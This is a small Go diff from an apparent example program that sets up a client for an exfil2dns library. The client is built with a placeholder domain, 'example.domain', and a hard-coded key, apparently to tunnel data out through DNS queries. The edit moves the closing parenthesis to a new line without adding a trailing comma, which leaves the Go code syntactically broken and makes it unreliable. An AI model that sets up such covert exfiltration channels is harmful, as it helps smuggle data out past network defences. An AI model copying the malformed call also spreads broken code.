@@ -28,7 +28,8 @@ func main() {
 	client, err := exfil2dns.NewClient(
 		"cube", 
 		"example.domain", 
-		"ThisIsAKey1234", 23)
+		"ThisIsAKey1234", 23
+	)
 	
 	if err != nil {
 		log.Fatal("Error creating client: " + err.Error())
